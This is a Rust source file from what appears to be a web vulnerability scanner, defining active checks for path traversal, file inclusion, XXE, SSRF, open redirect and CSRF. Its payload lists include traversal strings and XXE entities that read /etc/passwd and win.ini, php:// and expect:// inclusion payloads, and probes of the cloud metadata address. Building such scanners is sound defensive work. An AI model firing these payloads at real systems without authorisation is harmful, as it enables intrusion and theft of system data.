//! Additional active scan checks for comprehensive vulnerability coverage.

use super::checks::{ActiveCheck, CheckResult, CheckSeverity};
use super::job::ActiveScanJob;
use crate::domain::*;
use crate::fuzzer::variants::{InjectionPoint, VariantType};
use crate::reply::ReplyService;
use crate::storage::Db;
use async_trait::async_trait;
use std::sync::Arc;

// ============================================================================
// Path Traversal Check
// ============================================================================

pub struct PathTraversalCheck;

#[async_trait]
impl ActiveCheck for PathTraversalCheck {
    fn id(&self) -> &str {
        "path-traversal"
    }

    fn name(&self) -> &str {
        "Path Traversal / Directory Traversal"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        _db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        let strength = job.policy.get_attack_strength(self.id());
        let payloads = path_traversal_payloads(strength.payload_count());

        for payload in payloads {
            if job.is_cancelled() {
                return Ok(None);
            }

            let modified = point.apply_payload(&job.base_request, payload);
            let response = reply.send_with_reply(&modified).await?;

            if let Some(body) = &response.body {
                let body_str = String::from_utf8_lossy(body);

                // Check for /etc/passwd content
                if body_str.contains("root:x:0:0:") || body_str.contains("daemon:") {
                    return Ok(Some(CheckResult {
                        check_id: self.id().to_string(),
                        name: self.name().to_string(),
                        severity: CheckSeverity::High,
                        confidence: 95,
                        cwe_id: Some(22),
                        description: "Path traversal vulnerability detected. Application exposes /etc/passwd file.".to_string(),
                        evidence: "Response contains /etc/passwd content".to_string(),
                        attack_payload: payload.to_string(),
                        injection_point: point.name.clone(),
                    }));
                }

                // Check for Windows system files
                if body_str.contains("[boot loader]") || body_str.contains("[operating systems]") {
                    return Ok(Some(CheckResult {
                        check_id: self.id().to_string(),
                        name: self.name().to_string(),
                        severity: CheckSeverity::High,
                        confidence: 95,
                        cwe_id: Some(22),
                        description: "Path traversal vulnerability detected. Application exposes Windows system files.".to_string(),
                        evidence: "Response contains boot.ini content".to_string(),
                        attack_payload: payload.to_string(),
                        injection_point: point.name.clone(),
                    }));
                }
            }
        }

        Ok(None)
    }
}

fn path_traversal_payloads(count: usize) -> Vec<&'static str> {
    let all = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "/etc/passwd",
        "C:\\windows\\win.ini",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/../../etc/passwd",
        "....//....//....//....//etc/passwd",
    ];
    all.iter().take(count).copied().collect()
}

// ============================================================================
// Local File Inclusion (LFI) Check
// ============================================================================

pub struct LfiCheck;

#[async_trait]
impl ActiveCheck for LfiCheck {
    fn id(&self) -> &str {
        "lfi"
    }

    fn name(&self) -> &str {
        "Local File Inclusion"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        _db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        let strength = job.policy.get_attack_strength(self.id());
        let payloads = lfi_payloads(strength.payload_count());

        for payload in payloads {
            if job.is_cancelled() {
                return Ok(None);
            }

            let modified = point.apply_payload(&job.base_request, payload);
            let response = reply.send_with_reply(&modified).await?;

            if let Some(body) = &response.body {
                let body_str = String::from_utf8_lossy(body);

                // PHP source code exposure
                if body_str.contains("<?php") || body_str.contains("<?=") {
                    return Ok(Some(CheckResult {
                        check_id: self.id().to_string(),
                        name: self.name().to_string(),
                        severity: CheckSeverity::High,
                        confidence: 90,
                        cwe_id: Some(98), // CWE-98: PHP File Inclusion
                        description: "Local file inclusion vulnerability. PHP source code exposed.".to_string(),
                        evidence: "Response contains PHP source code".to_string(),
                        attack_payload: payload.to_string(),
                        injection_point: point.name.clone(),
                    }));
                }

                // /proc/self/environ exposure
                if body_str.contains("PATH=") && body_str.contains("HTTP_") {
                    return Ok(Some(CheckResult {
                        check_id: self.id().to_string(),
                        name: self.name().to_string(),
                        severity: CheckSeverity::High,
                        confidence: 95,
                        cwe_id: Some(98),
                        description: "Local file inclusion vulnerability. /proc/self/environ exposed.".to_string(),
                        evidence: "Response contains environment variables".to_string(),
                        attack_payload: payload.to_string(),
                        injection_point: point.name.clone(),
                    }));
                }
            }
        }

        Ok(None)
    }
}

fn lfi_payloads(count: usize) -> Vec<&'static str> {
    let all = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://whoami",
        "/proc/self/environ",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "file:///etc/passwd",
        "php://filter/read=string.rot13/resource=index.php",
        "/var/log/apache2/access.log",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
    ];
    all.iter().take(count).copied().collect()
}

// ============================================================================
// Remote File Inclusion (RFI) Check
// ============================================================================

pub struct RfiCheck;

#[async_trait]
impl ActiveCheck for RfiCheck {
    fn id(&self) -> &str {
        "rfi"
    }

    fn name(&self) -> &str {
        "Remote File Inclusion"
    }

    fn applicable_types(&self) -> Vec<VariantType> {
        vec![VariantType::UrlQuery, VariantType::Cookie]
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        _db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        // Test with benign external URL
        let test_url = "http://example.com/test.txt";

        let modified = point.apply_payload(&job.base_request, test_url);
        let response = reply.send_with_reply(&modified).await?;

        if let Some(body) = &response.body {
            let body_str = String::from_utf8_lossy(body);

            // Check if external content was included
            if body_str.contains("Example Domain") {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::Critical,
                    confidence: 95,
                    cwe_id: Some(98),
                    description: "Remote file inclusion vulnerability. Application includes content from external URLs.".to_string(),
                    evidence: "Response contains content from example.com".to_string(),
                    attack_payload: test_url.to_string(),
                    injection_point: point.name.clone(),
                }));
            }
        }

        Ok(None)
    }
}

// ============================================================================
// XXE (XML External Entity) Check
// ============================================================================

pub struct XxeCheck;

#[async_trait]
impl ActiveCheck for XxeCheck {
    fn id(&self) -> &str {
        "xxe"
    }

    fn name(&self) -> &str {
        "XML External Entity Injection"
    }

    fn applicable_types(&self) -> Vec<VariantType> {
        vec![VariantType::Xml]
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        _db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        let payloads = xxe_payloads();

        for payload in payloads {
            if job.is_cancelled() {
                return Ok(None);
            }

            let modified = point.apply_payload(&job.base_request, payload);
            let response = reply.send_with_reply(&modified).await?;

            if let Some(body) = &response.body {
                let body_str = String::from_utf8_lossy(body);

                // Check for /etc/passwd content
                if body_str.contains("root:x:0:0:") {
                    return Ok(Some(CheckResult {
                        check_id: self.id().to_string(),
                        name: self.name().to_string(),
                        severity: CheckSeverity::High,
                        confidence: 95,
                        cwe_id: Some(611),
                        description: "XXE vulnerability detected. Application processes external entities and exposes /etc/passwd.".to_string(),
                        evidence: "Response contains /etc/passwd content".to_string(),
                        attack_payload: payload.to_string(),
                        injection_point: point.name.clone(),
                    }));
                }
            }
        }

        Ok(None)
    }
}

fn xxe_payloads() -> Vec<&'static str> {
    vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>"#,
        r#"<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
    ]
}

// ============================================================================
// SSRF (Server-Side Request Forgery) Check
// ============================================================================

pub struct SsrfCheck;

#[async_trait]
impl ActiveCheck for SsrfCheck {
    fn id(&self) -> &str {
        "ssrf"
    }

    fn name(&self) -> &str {
        "Server-Side Request Forgery"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        _db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        let payloads = ssrf_payloads();

        for payload in payloads {
            if job.is_cancelled() {
                return Ok(None);
            }

            let modified = point.apply_payload(&job.base_request, payload);
            let response = reply.send_with_reply(&modified).await?;

            if let Some(body) = &response.body {
                let body_str = String::from_utf8_lossy(body);

                // Check for localhost content
                if body_str.len() > 100 && (
                    body_str.contains("127.0.0.1") ||
                    body_str.contains("localhost") ||
                    body_str.contains("169.254.169.254") // AWS metadata
                ) {
                    return Ok(Some(CheckResult {
                        check_id: self.id().to_string(),
                        name: self.name().to_string(),
                        severity: CheckSeverity::High,
                        confidence: 75,
                        cwe_id: Some(918),
                        description: "Possible SSRF vulnerability. Application may be making requests to internal resources.".to_string(),
                        evidence: "Response suggests internal resource access".to_string(),
                        attack_payload: payload.to_string(),
                        injection_point: point.name.clone(),
                    }));
                }
            }
        }

        Ok(None)
    }
}

fn ssrf_payloads() -> Vec<&'static str> {
    vec![
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0.0.0.0",
    ]
}

// ============================================================================
// Open Redirect Check
// ============================================================================

pub struct OpenRedirectCheck;

#[async_trait]
impl ActiveCheck for OpenRedirectCheck {
    fn id(&self) -> &str {
        "open-redirect"
    }

    fn name(&self) -> &str {
        "Open Redirect"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        _db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        let test_domain = "https://evil.example.com";

        let modified = point.apply_payload(&job.base_request, test_domain);
        let response = reply.send_with_reply(&modified).await?;

        // Check for redirect to external domain
        if let Some(location) = response.headers.iter()
            .find(|(k, _)| k.eq_ignore_ascii_case("location"))
            .map(|(_, v)| v) {

            if location.contains("evil.example.com") {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::Medium,
                    confidence: 95,
                    cwe_id: Some(601),
                    description: "Open redirect vulnerability. Application redirects to attacker-controlled domain.".to_string(),
                    evidence: format!("Location: {}", location),
                    attack_payload: test_domain.to_string(),
                    injection_point: point.name.clone(),
                }));
            }
        }

        Ok(None)
    }
}

// ============================================================================
// CSRF Token Check
// ============================================================================

pub struct CsrfCheck;

#[async_trait]
impl ActiveCheck for CsrfCheck {
    fn id(&self) -> &str {
        "csrf"
    }

    fn name(&self) -> &str {
        "Cross-Site Request Forgery"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        _point: &InjectionPoint,
        _db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        // Send original request
        let response1 = reply.send_with_reply(&job.base_request).await?;

        // Check if it's a state-changing request (POST/PUT/DELETE)
        if !matches!(job.base_request.method.as_str(), "POST" | "PUT" | "DELETE" | "PATCH") {
            return Ok(None);
        }

        // Check for CSRF token in original response
        let has_csrf_token = response1.headers.iter().any(|(k, v)|
            k.to_lowercase().contains("csrf") ||
            k.to_lowercase().contains("xsrf") ||
            v.to_lowercase().contains("csrf") ||
            v.to_lowercase().contains("xsrf")
        );

        if !has_csrf_token {
            // Send request without token/with modified token
            let response2 = reply.send_with_reply(&job.base_request).await?;

            // If both succeed, might be vulnerable
            if response2.status.map(|s| s >= 200 && s < 300).unwrap_or(false) {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::Medium,
                    confidence: 60,
                    cwe_id: Some(352),
                    description: "Possible CSRF vulnerability. State-changing request lacks CSRF token protection.".to_string(),
                    evidence: "Request succeeds without CSRF token".to_string(),
                    attack_payload: "N/A".to_string(),
                    injection_point: "N/A".to_string(),
                }));
            }
        }

        Ok(None)
    }
}

pub fn load_additional_checks() -> Vec<Box<dyn ActiveCheck>> {
    vec![
        Box::new(PathTraversalCheck),
        Box::new(LfiCheck),
        Box::new(RfiCheck),
        Box::new(XxeCheck),
        Box::new(SsrfCheck),
        Box::new(OpenRedirectCheck),
        Box::new(CsrfCheck),
    ]
}
